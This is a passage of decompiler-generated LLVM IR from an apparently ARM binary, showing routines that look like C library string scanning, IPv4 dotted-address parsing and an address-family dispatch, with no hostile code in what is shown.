  %v2_1a10c3 = call i32 @function_142f0(i32 %arg1, i32 %v1_1a0dc)
  %v2_1a1105 = icmp eq i32 %v2_1a10c3, 0
  br i1 %v2_1a1105, label %dec_label_pc_1a118, label %dec_label_pc_1a0fc

dec_label_pc_1a0f0:                               ; preds = %dec_label_pc_1a0d8
  %v2_1a0f4 = call i32 @function_142f0(i32 %arg1, i32 0)
  br label %dec_label_pc_1a11c

dec_label_pc_1a0fc:                               ; preds = %dec_label_pc_1a104.preheader, %dec_label_pc_1a0fc
  %v2_1a10c6 = phi i32 [ %v2_1a10c, %dec_label_pc_1a0fc ], [ %v2_1a10c3, %dec_label_pc_1a104.preheader ]
  store i32 %v2_1a10c6, i32* @r5, align 4
  %v1_1a100 = add i32 %v2_1a10c6, 1
  store i32 %v1_1a100, i32* @r0, align 4
  %v0_1a108 = load i32, i32* @r4, align 4
  %v2_1a10c = call i32 @function_142f0(i32 %v1_1a100, i32 %v0_1a108)
  %v2_1a110 = icmp eq i32 %v2_1a10c, 0
  br i1 %v2_1a110, label %dec_label_pc_1a118, label %dec_label_pc_1a0fc

dec_label_pc_1a118:                               ; preds = %dec_label_pc_1a0fc, %dec_label_pc_1a104.preheader
  %v0_1a118 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a11c

dec_label_pc_1a11c:                               ; preds = %dec_label_pc_1a0f0, %dec_label_pc_1a118
  %storemerge = phi i32 [ %v2_1a0f4, %dec_label_pc_1a0f0 ], [ %v0_1a118, %dec_label_pc_1a118 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_1a10c, { 1, 0 }
  uselistorder i32 %v1_1a100, { 1, 0 }
  uselistorder i32 %v1_1a0dc, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1a11c, { 1, 0 }
  uselistorder label %dec_label_pc_1a0fc, { 1, 0 }
}

define i32 @function_1a128(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1a128:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_1a128 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1a138 = call i32 @function_14000()
  %v0_1a13c = load i32, i32* @r5, align 4
  %v1_1a13c = load i32, i32* @r4, align 4
  %v2_1a13c = add i32 %v1_1a13c, %v0_1a13c
  store i32 %v6_1a128, i32* @r5, align 4
  ret i32 %v2_1a13c
}

define i32 @function_1a14c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1a14c:
  %v1_1a150 = urem i32 %arg1, 256
  %v0_1a1702 = load i32, i32* @r0, align 4
  %v1_1a1703 = urem i32 %v0_1a1702, 4
  %v2_1a1704 = icmp eq i32 %v1_1a1703, 0
  br i1 %v2_1a1704, label %dec_label_pc_1a178, label %dec_label_pc_1a158

dec_label_pc_1a158:                               ; preds = %dec_label_pc_1a14c, %dec_label_pc_1a16c
  %v0_1a16c = phi i32 [ %v1_1a16c, %dec_label_pc_1a16c ], [ %v0_1a1702, %dec_label_pc_1a14c ]
  %v1_1a158 = inttoptr i32 %v0_1a16c to i8*
  %v2_1a158 = load i8, i8* %v1_1a158, align 1
  %v3_1a158 = zext i8 %v2_1a158 to i32
  %v9_1a15c = icmp eq i32 %v3_1a158, %v1_1a150
  br i1 %v9_1a15c, label %dec_label_pc_1a228, label %dec_label_pc_1a164

dec_label_pc_1a164:                               ; preds = %dec_label_pc_1a158
  %v2_1a164 = icmp eq i8 %v2_1a158, 0
  br i1 %v2_1a164, label %dec_label_pc_1a228, label %dec_label_pc_1a16c

dec_label_pc_1a16c:                               ; preds = %dec_label_pc_1a164
  %v1_1a16c = add i32 %v0_1a16c, 1
  %v1_1a170 = urem i32 %v1_1a16c, 4
  %v2_1a170 = icmp eq i32 %v1_1a170, 0
  br i1 %v2_1a170, label %dec_label_pc_1a178, label %dec_label_pc_1a158

dec_label_pc_1a178:                               ; preds = %dec_label_pc_1a16c, %dec_label_pc_1a14c
  %v0_1a17c = phi i32 [ %v0_1a1702, %dec_label_pc_1a14c ], [ %v1_1a16c, %dec_label_pc_1a16c ]
  %v4_1a178 = mul nuw nsw i32 %v1_1a150, 256
  %v5_1a178 = or i32 %v4_1a178, %v1_1a150
  %v4_1a180 = mul i32 %v5_1a178, 65536
  %v5_1a180 = or i32 %v4_1a180, %v5_1a178
  br label %dec_label_pc_1a184

dec_label_pc_1a184:                               ; preds = %dec_label_pc_1a220, %dec_label_pc_1a1c0, %dec_label_pc_1a178
  %v0_1a1e8 = phi i32 [ %v0_1a17c, %dec_label_pc_1a178 ], [ %v4_1a184, %dec_label_pc_1a1c0 ], [ %v4_1a184, %dec_label_pc_1a220 ]
  %v1_1a184 = inttoptr i32 %v0_1a1e8 to i32*
  %v2_1a184 = load i32, i32* %v1_1a184, align 4
  %v4_1a184 = add i32 %v0_1a1e8, 4
  %v2_1a18c = xor i32 %v2_1a184, %v5_1a180
  %v2_1a190 = add i32 %v2_1a18c, 2130640639
  store i32 %v2_1a190, i32* @ip, align 4
  %v2_1a198 = add i32 %v2_1a184, 2130640639
  %v1_1a19c = sub i32 -1, %v2_1a184
  %v2_1a1a0 = xor i32 %v2_1a198, %v1_1a19c
  %v2_1a1ac = and i32 %v2_1a1a0, -2130640640
  %v2_1a1b4 = icmp eq i32 %v2_1a1ac, 0
  br i1 %v2_1a1b4, label %dec_label_pc_1a1c0, label %dec_label_pc_1a1c8

dec_label_pc_1a1c0:                               ; preds = %dec_label_pc_1a184
  %v1_1a1a8 = sub i32 -1, %v2_1a18c
  %v2_1a1b0 = xor i32 %v2_1a190, %v1_1a1a8
  %v2_1a1b8 = and i32 %v2_1a1b0, -2130640640
  %v2_1a1c0 = icmp eq i32 %v2_1a1b8, 0
  br i1 %v2_1a1c0, label %dec_label_pc_1a184, label %dec_label_pc_1a1c8

dec_label_pc_1a1c8:                               ; preds = %dec_label_pc_1a184, %dec_label_pc_1a1c0
  %v2_1a1c8 = inttoptr i32 %v0_1a1e8 to i8*
  %v3_1a1c8 = load i8, i8* %v2_1a1c8, align 1
  %v4_1a1c8 = zext i8 %v3_1a1c8 to i32
  %v9_1a1cc = icmp eq i32 %v4_1a1c8, %v1_1a150
  br i1 %v9_1a1cc, label %dec_label_pc_1a228, label %dec_label_pc_1a1d8

dec_label_pc_1a1d8:                               ; preds = %dec_label_pc_1a1c8
  %v2_1a1d8 = icmp eq i8 %v3_1a1c8, 0
  br i1 %v2_1a1d8, label %dec_label_pc_1a228, label %dec_label_pc_1a1e0

dec_label_pc_1a1e0:                               ; preds = %dec_label_pc_1a1d8
  %v1_1a1e0 = add i32 %v0_1a1e8, 1
  %v2_1a1e0 = inttoptr i32 %v1_1a1e0 to i8*
  %v3_1a1e0 = load i8, i8* %v2_1a1e0, align 1
  %v4_1a1e0 = zext i8 %v3_1a1e0 to i32
  %v9_1a1e4 = icmp eq i32 %v4_1a1e0, %v1_1a150
  br i1 %v9_1a1e4, label %dec_label_pc_1a228, label %dec_label_pc_1a1f0

dec_label_pc_1a1f0:                               ; preds = %dec_label_pc_1a1e0
  %v2_1a1f0 = icmp eq i8 %v3_1a1e0, 0
  br i1 %v2_1a1f0, label %dec_label_pc_1a228, label %dec_label_pc_1a1f8

dec_label_pc_1a1f8:                               ; preds = %dec_label_pc_1a1f0
  %v1_1a1f8 = add i32 %v0_1a1e8, 2
  %v2_1a1f8 = inttoptr i32 %v1_1a1f8 to i8*
  %v3_1a1f8 = load i8, i8* %v2_1a1f8, align 1
  %v4_1a1f8 = zext i8 %v3_1a1f8 to i32
  %v9_1a1fc = icmp eq i32 %v4_1a1f8, %v1_1a150
  br i1 %v9_1a1fc, label %dec_label_pc_1a228, label %dec_label_pc_1a208

dec_label_pc_1a208:                               ; preds = %dec_label_pc_1a1f8
  %v2_1a208 = icmp eq i8 %v3_1a1f8, 0
  br i1 %v2_1a208, label %dec_label_pc_1a228, label %dec_label_pc_1a210

dec_label_pc_1a210:                               ; preds = %dec_label_pc_1a208
  %v1_1a210 = add i32 %v0_1a1e8, 3
  %v2_1a210 = inttoptr i32 %v1_1a210 to i8*
  %v3_1a210 = load i8, i8* %v2_1a210, align 1
  %v4_1a210 = zext i8 %v3_1a210 to i32
  %v9_1a214 = icmp eq i32 %v4_1a210, %v1_1a150
  br i1 %v9_1a214, label %dec_label_pc_1a228, label %dec_label_pc_1a220

dec_label_pc_1a220:                               ; preds = %dec_label_pc_1a210
  %v2_1a220 = icmp eq i8 %v3_1a210, 0
  br i1 %v2_1a220, label %dec_label_pc_1a228, label %dec_label_pc_1a184

dec_label_pc_1a228:                               ; preds = %dec_label_pc_1a164, %dec_label_pc_1a158, %dec_label_pc_1a220, %dec_label_pc_1a210, %dec_label_pc_1a208, %dec_label_pc_1a1f8, %dec_label_pc_1a1f0, %dec_label_pc_1a1e0, %dec_label_pc_1a1d8, %dec_label_pc_1a1c8
  %v1_1a22c = phi i32 [ %v1_1a210, %dec_label_pc_1a220 ], [ %v1_1a210, %dec_label_pc_1a210 ], [ %v1_1a1f8, %dec_label_pc_1a208 ], [ %v1_1a1f8, %dec_label_pc_1a1f8 ], [ %v1_1a1e0, %dec_label_pc_1a1f0 ], [ %v1_1a1e0, %dec_label_pc_1a1e0 ], [ %v0_1a1e8, %dec_label_pc_1a1d8 ], [ %v0_1a1e8, %dec_label_pc_1a1c8 ], [ %v0_1a16c, %dec_label_pc_1a158 ], [ %v0_1a16c, %dec_label_pc_1a164 ]
  ret i32 %v1_1a22c

; uselistorder directives
  uselistorder i32 %v4_1a184, { 1, 0 }
  uselistorder i32 %v2_1a184, { 0, 2, 1 }
  uselistorder i32 %v0_1a1e8, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1a178, { 1, 0 }
  uselistorder i32 %v1_1a16c, { 1, 0, 2 }
  uselistorder i32 %v0_1a1702, { 2, 1, 0 }
  uselistorder i32 %v1_1a150, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_1a228, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1a1c8, { 1, 0 }
  uselistorder label %dec_label_pc_1a158, { 1, 0 }
}

define i32 @function_1a238(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a238:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a264

dec_label_pc_1a240:                               ; preds = %dec_label_pc_1a250
  %v3_1a250 = zext i8 %v2_1a250 to i32
  %v1_1a258 = add i32 %v0_1a258, 1
  %v1_1a240 = load i32, i32* %r0.global-to-local, align 4
  %v9_1a240 = icmp eq i32 %v3_1a250, %v1_1a240
  br i1 %v9_1a240, label %dec_label_pc_1a248, label %dec_label_pc_1a250

dec_label_pc_1a248:                               ; preds = %dec_label_pc_1a240
  %v0_1a248 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1a248, i32* %r0.global-to-local, align 4
  ret i32 %v0_1a248

dec_label_pc_1a250:                               ; preds = %dec_label_pc_1a240, %dec_label_pc_1a264
  %v0_1a258 = phi i32 [ %v1_1a258, %dec_label_pc_1a240 ], [ %arg2, %dec_label_pc_1a264 ]
  %v1_1a250 = inttoptr i32 %v0_1a258 to i8*
  %v2_1a250 = load i8, i8* %v1_1a250, align 1
  %v2_1a254 = icmp eq i8 %v2_1a250, 0
  br i1 %v2_1a254, label %dec_label_pc_1a260, label %dec_label_pc_1a240

dec_label_pc_1a260:                               ; preds = %dec_label_pc_1a250
  %v0_1a260 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a260 = add i32 %v0_1a260, 1
  br label %dec_label_pc_1a264

dec_label_pc_1a264:                               ; preds = %dec_label_pc_1a238, %dec_label_pc_1a260
  %storemerge = phi i32 [ %tmp, %dec_label_pc_1a238 ], [ %v1_1a260, %dec_label_pc_1a260 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1a264 = inttoptr i32 %storemerge to i8*
  %v2_1a264 = load i8, i8* %v1_1a264, align 1
  %v3_1a264 = zext i8 %v2_1a264 to i32
  store i32 %v3_1a264, i32* %r0.global-to-local, align 4
  %v2_1a268 = icmp eq i8 %v2_1a264, 0
  %v0_1a26c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1a268, i32 %v0_1a26c)
  br label %dec_label_pc_1a250

; uselistorder directives
  uselistorder i32 %v0_1a258, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1a264, { 1, 0 }
  uselistorder label %dec_label_pc_1a250, { 1, 0 }
}

define i32 @function_1a278(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a278:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1a278 = load i32, i32* @r4, align 4
  store i32 %v3_1a278, i32* %stack_var_-28, align 4
  %v0_1a280 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a280 = icmp eq i32 %v0_1a280, 0
  br i1 %v2_1a280, label %dec_label_pc_1a35c, label %dec_label_pc_1a290

dec_label_pc_1a290:                               ; preds = %dec_label_pc_1a278
  br label %dec_label_pc_1a2a8

dec_label_pc_1a2a8:                               ; preds = %dec_label_pc_1a290, %dec_label_pc_1a320
  %v1_1a320 = phi i32 [ 0, %dec_label_pc_1a290 ], [ %v5_1a320, %dec_label_pc_1a320 ]
  %v0_1a324 = phi i32 [ 1, %dec_label_pc_1a290 ], [ %v1_1a324, %dec_label_pc_1a320 ]
  %v0_1a2a8 = phi i32 [ %v0_1a280, %dec_label_pc_1a290 ], [ %v0_1a2a812, %dec_label_pc_1a320 ]
  %v1_1a2a8 = inttoptr i32 %v0_1a2a8 to i8*
  %v2_1a2a8 = load i8, i8* %v1_1a2a8, align 1
  %v3_1a2a8 = zext i8 %v2_1a2a8 to i32
  %v4_1a2ac = load i32, i32* inttoptr (i32 181784 to i32*), align 8
  %v2_1a2b0 = mul nuw nsw i32 %v3_1a2a8, 2
  %v2_1a2b4 = add i32 %v2_1a2b0, %v4_1a2ac
  %v3_1a2b4 = inttoptr i32 %v2_1a2b4 to i16*
  %v4_1a2b4 = load i16, i16* %v3_1a2b4, align 2
  %v1_1a2b8 = and i16 %v4_1a2b4, 8
  %v2_1a2b8 = icmp eq i16 %v1_1a2b8, 0
  br i1 %v2_1a2b8, label %dec_label_pc_1a35c, label %dec_label_pc_1a2c0

dec_label_pc_1a2c0:                               ; preds = %dec_label_pc_1a2a8
  br label %dec_label_pc_1a2e0

dec_label_pc_1a2c8:                               ; preds = %dec_label_pc_1a2e0
  %v2_1a2c8 = mul i32 %v0_1a320, 10
  %v1_1a2cc = add i32 %v2_1a2c8, -48
  %v2_1a2d0 = add i32 %v3_1a2e0, %v1_1a2cc
  %v8_1a2d8 = icmp sgt i32 %v2_1a2d0, 255
  br i1 %v8_1a2d8, label %dec_label_pc_1a35c, label %dec_label_pc_1a2dc

dec_label_pc_1a2dc:                               ; preds = %dec_label_pc_1a2c8
  %v1_1a2dc = add i32 %v0_1a310, 1
  store i32 %v1_1a2dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a2e0

dec_label_pc_1a2e0:                               ; preds = %dec_label_pc_1a2c0, %dec_label_pc_1a2dc
  %v0_1a320 = phi i32 [ 0, %dec_label_pc_1a2c0 ], [ %v2_1a2d0, %dec_label_pc_1a2dc ]
  %v0_1a310 = phi i32 [ %v0_1a2a8, %dec_label_pc_1a2c0 ], [ %v1_1a2dc, %dec_label_pc_1a2dc ]
  %v1_1a2e0 = inttoptr i32 %v0_1a310 to i8*
  %v2_1a2e0 = load i8, i8* %v1_1a2e0, align 1
  %v3_1a2e0 = zext i8 %v2_1a2e0 to i32
  %v2_1a2e4 = mul nuw nsw i32 %v3_1a2e0, 2
  %v2_1a2e8 = add i32 %v2_1a2e4, %v4_1a2ac
  %v3_1a2e8 = inttoptr i32 %v2_1a2e8 to i16*
  %v4_1a2e8 = load i16, i16* %v3_1a2e8, align 2
  %v6_1a2e8 = zext i16 %v4_1a2e8 to i32
  %v1_1a2ec = and i32 %v6_1a2e8, 8
  %v2_1a2ec = icmp eq i32 %v1_1a2ec, 0
  br i1 %v2_1a2ec, label %dec_label_pc_1a2f4, label %dec_label_pc_1a2c8

dec_label_pc_1a2f4:                               ; preds = %dec_label_pc_1a2e0
  %v7_1a2f4 = icmp eq i32 %v0_1a324, 4
  br i1 %v7_1a2f4, label %dec_label_pc_1a30c, label %dec_label_pc_1a2fc

dec_label_pc_1a2fc:                               ; preds = %dec_label_pc_1a2f4
  %v7_1a2fc = icmp eq i8 %v2_1a2e0, 46
  br i1 %v7_1a2fc, label %dec_label_pc_1a304, label %dec_label_pc_1a35c

dec_label_pc_1a304:                               ; preds = %dec_label_pc_1a2fc
  %v1_1a304 = add i32 %v0_1a310, 1
  store i32 %v1_1a304, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a320

dec_label_pc_1a30c:                               ; preds = %dec_label_pc_1a2f4
  %v2_1a30c = icmp eq i8 %v2_1a2e0, 0
  %v1_1a310 = add i32 %v0_1a310, 1
  store i32 %v1_1a310, i32* %r0.global-to-local, align 4
  br i1 %v2_1a30c, label %dec_label_pc_1a320, label %dec_label_pc_1a318

dec_label_pc_1a318:                               ; preds = %dec_label_pc_1a30c
  %v1_1a318 = and i32 %v6_1a2e8, 32
  %v2_1a318 = icmp eq i32 %v1_1a318, 0
  br i1 %v2_1a318, label %dec_label_pc_1a35c, label %dec_label_pc_1a320

dec_label_pc_1a320:                               ; preds = %dec_label_pc_1a318, %dec_label_pc_1a30c, %dec_label_pc_1a304
  %v0_1a2a812 = phi i32 [ %v1_1a310, %dec_label_pc_1a318 ], [ %v1_1a310, %dec_label_pc_1a30c ], [ %v1_1a304, %dec_label_pc_1a304 ]
  %v4_1a320 = mul i32 %v1_1a320, 256
  %v5_1a320 = or i32 %v0_1a320, %v4_1a320
  %v1_1a324 = add nuw nsw i32 %v0_1a324, 1
  %v7_1a32c = icmp slt i32 %v1_1a324, 5
  br i1 %v7_1a32c, label %dec_label_pc_1a2a8, label %dec_label_pc_1a330

dec_label_pc_1a330:                               ; preds = %dec_label_pc_1a320
  %v2_1a330 = icmp eq i32 %arg2, 0
  br i1 %v2_1a330, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_1a330
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a360

bb:                                               ; preds = %dec_label_pc_1a330
  %v4_1a334 = udiv i32 %v5_1a320, 16777216
  %v2_1a338 = udiv i32 %v5_1a320, 256
  %v5_1a33c = and i32 %v2_1a338, 65280
  %v2_1a340 = and i32 %v5_1a320, 65280
  %v5_1a344 = mul nuw nsw i32 %v2_1a340, 256
  %v5_1a348 = mul i32 %v0_1a320, 16777216
  %v6_1a33c = or i32 %v4_1a334, %v5_1a348
  %v6_1a344 = or i32 %v6_1a33c, %v5_1a33c
  %v6_1a348 = or i32 %v6_1a344, %v5_1a344
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1a354 = inttoptr i32 %arg2 to i32*
  store i32 %v6_1a348, i32* %v3_1a354, align 4
  %v2_1a360.pre = load i32, i32* %stack_var_-28, align 4
  %v1_1a364.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a360

dec_label_pc_1a35c:                               ; preds = %dec_label_pc_1a2fc, %dec_label_pc_1a318, %dec_label_pc_1a2a8, %dec_label_pc_1a2c8, %dec_label_pc_1a278
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a360

dec_label_pc_1a360:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1a35c
  %v1_1a364 = phi i32 [ %v1_1a364.pre, %bb ], [ 0, %dec_label_pc_1a35c ], [ 1, %.thread7.thread ]
  %v2_1a360 = phi i32 [ %v2_1a360.pre, %bb ], [ %v3_1a278, %dec_label_pc_1a35c ], [ %v3_1a278, %.thread7.thread ]
  store i32 %v2_1a360, i32* @r4, align 4
  ret i32 %v1_1a364

; uselistorder directives
  uselistorder i32 %v1_1a324, { 1, 0 }
  uselistorder i32 %v5_1a320, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1a310, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 5, 1, 2, 3, 4, 0, 6 }
  uselistorder label %dec_label_pc_1a360, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a35c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1a2e0, { 1, 0 }
  uselistorder label %dec_label_pc_1a2a8, { 1, 0 }
}

define i32 @function_1a370(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1a370:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_1a370 = load i32, i32* @r6, align 4
  %v12_1a370 = load i32, i32* @r7, align 4
  %v15_1a370 = load i32, i32* @r8, align 4
  %v18_1a370 = load i32, i32* @sb, align 4
  %v21_1a370 = load i32, i32* @sl, align 4
  %v24_1a370 = load i32, i32* @fp, align 4
  %v7_1a374 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_1a374, label %dec_label_pc_1a398, label %dec_label_pc_1a3b8

dec_label_pc_1a398:                               ; preds = %dec_label_pc_1a370
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_1a3b0 = call i32 @function_1c8a8()
  store i32 %v0_1a3b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a604

dec_label_pc_1a3b8:                               ; preds = %dec_label_pc_1a370
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_1a3c0 = icmp eq i32 %arg2, 10
  %v2_1a3c4 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_1a3c4, align 4
  br i1 %v7_1a3c0, label %dec_label_pc_1a3cc, label %dec_label_pc_1a600

dec_label_pc_1a3cc:                               ; preds = %dec_label_pc_1a3b8
  %v1_1a3cc = load i32, i32* @r7, align 4
  %v9_1a3cc = icmp eq i32 %v1_1a3cc, %arg1
  br i1 %v9_1a3cc, label %dec_label_pc_1a600, label %dec_label_pc_1a3d4

dec_label_pc_1a3d4:                               ; preds = %dec_label_pc_1a3cc
  %v0_1a3d4 = call i32 @function_12b24()
  store i32 %v0_1a3d4, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_1a3d4, i32* @r5, align 4
  %v0_1a3e0 = load i32, i32* @r4, align 4
  %v0_1a3e4 = load i32, i32* @r6, align 4
  store i32 %v0_1a3e4, i32* %r2.global-to-local, align 4
  %v1_1a3e8 = inttoptr i32 %v0_1a3d4 to i32*
  %v2_1a3e8 = load i32, i32* %v1_1a3e8, align 4
  store i32 %v2_1a3e8, i32* @r4, align 4
  %v0_1a3ec = load i32, i32* @r8, align 4
  store i32 %v0_1a3ec, i32* %r3.global-to-local, align 4
  %v0_1a3f0 = load i32, i32* @r7, align 4
  store i32 %v0_1a3f0, i32* %v1_1a3e8, align 4
  %v0_1a3f4 = load i32, i32* @sb, align 4
  store i32 %v0_1a3f4, i32* %r0.global-to-local, align 4
  %v2_1a3f8 = load i32, i32* @sl, align 4
  %v5_1a3f8 = load i32, i32* %ip.global-to-local, align 4
  %v0_1a3fc = load i32, i32* @fp, align 4
  %v7_1a400 = call i32 @function_1c85c(i32 %v0_1a3f4, i32 %v0_1a3e0, i32 %v0_1a3e4, i32 %v0_1a3ec, i32 %v2_1a3f8, i32 %v5_1a3f8, i32 %v0_1a3fc)
  store i32 %v7_1a400, i32* %r0.global-to-local, align 4
  %v2_1a404 = icmp eq i32 %v7_1a400, 0
  br i1 %v2_1a404, label %bb, label %dec_label_pc_1a410

bb:                                               ; preds = %dec_label_pc_1a3d4
  %v1_1a408 = load i32, i32* @r4, align 4
  %v2_1a408 = load i32, i32* @r5, align 4
  %v3_1a408 = inttoptr i32 %v2_1a408 to i32*
  store i32 %v1_1a408, i32* %v3_1a408, align 4
  br label %dec_label_pc_1a604

dec_label_pc_1a410:                               ; preds = %dec_label_pc_1a3d4
  %v0_1a410 = load i32, i32* @fp, align 4
  %v1_1a410 = inttoptr i32 %v0_1a410 to i32*
  %v2_1a410 = load i32, i32* %v1_1a410, align 4
  store i32 %v2_1a410, i32* %r3.global-to-local, align 4
  %v7_1a414 = icmp eq i32 %v2_1a410, 1
  br i1 %v7_1a414, label %dec_label_pc_1a430, label %dec_label_pc_1a41c

dec_label_pc_1a41c:                               ; preds = %dec_label_pc_1a410
  %v7_1a41c = icmp eq i32 %v2_1a410, 4
  br i1 %v7_1a41c, label %dec_label_pc_1a44c, label %dec_label_pc_1a424

dec_label_pc_1a424:                               ; preds = %dec_label_pc_1a41c
  %v3_1a424 = icmp eq i32 %v2_1a410, -1
  br i1 %v3_1a424, label %dec_label_pc_1a440, label %dec_label_pc_1a604

dec_label_pc_1a430:                               ; preds = %dec_label_pc_1a410
  %v7_1a430 = icmp eq i32 %v7_1a400, 2
  br i1 %v7_1a430, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_1a430
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1a450

.thread1:                                         ; preds = %dec_label_pc_1a430
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_1a450

dec_label_pc_1a440:                               ; preds = %dec_label_pc_1a424
  %v0_1a440 = load i32, i32* @r5, align 4
  %v1_1a440 = inttoptr i32 %v0_1a440 to i32*
  %v2_1a440 = load i32, i32* %v1_1a440, align 4
  store i32 %v2_1a440, i32* %r3.global-to-local, align 4
  %v7_1a444 = icmp eq i32 %v2_1a440, 2
  br i1 %v7_1a444, label %dec_label_pc_1a44c, label %dec_label_pc_1a604

dec_label_pc_1a44c:                               ; preds = %dec_label_pc_1a440, %dec_label_pc_1a41c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1a450

dec_label_pc_1a450:                               ; preds = %bb29, %.thread1, %dec_label_pc_1a44c
  %v0_1a450 = load i32, i32* @r8, align 4
  %v1_1a450 = sub i32 0, %v0_1a450
  %v1_1a454 = urem i32 %v1_1a450, 4
  store i32 %v1_1a454, i32* %r0.global-to-local, align 4
  %v1_1a458 = load i32, i32* @sl, align 4
  %v2_1a458 = sub i32 %v1_1a458, %v1_1a454
  %v1_1a45c = add i32 %v2_1a458, -24
  store i32 %v1_1a45c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1a468 = load i32, i32* @r4, align 4
  %v1_1a468 = load i32, i32* @r5, align 4
  %v2_1a468 = inttoptr i32 %v1_1a468 to i32*
  store i32 %v0_1a468, i32* %v2_1a468, align 4
  %v7_1a46c = icmp sgt i32 %v1_1a45c, 255
  br i1 %v7_1a46c, label %dec_label_pc_1a478, label %bb30

bb30:                                             ; preds = %dec_label_pc_1a450
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_1a470 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a470 = load i32, i32* @fp, align 4
  %v2_1a470 = inttoptr i32 %v1_1a470 to i32*
  store i32 %v0_1a470, i32* %v2_1a470, align 4
  br label %dec_label_pc_1a604

dec_label_pc_1a478:                               ; preds = %dec_label_pc_1a450
  %v0_1a4703 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a4704 = load i32, i32* @fp, align 4
  %v2_1a4705 = inttoptr i32 %v1_1a4704 to i32*
  store i32 %v0_1a4703, i32* %v2_1a4705, align 4
  %v0_1a478 = load i32, i32* @r8, align 4
  %v1_1a478 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a478 = add i32 %v1_1a478, %v0_1a478
  store i32 %v2_1a478, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_1a480 = add i32 %v2_1a478, 16
  store i32 %v1_1a480, i32* %r2.global-to-local, align 4
  %v1_1a484 = add i32 %v2_1a478, 24
  store i32 %v1_1a484, i32* @r5, align 4
  %v3_1a48c = inttoptr i32 %v1_1a480 to i32*
  store i32 %v2_1a478, i32* %v3_1a48c, align 4
  %v0_1a490 = load i32, i32* @sb, align 4
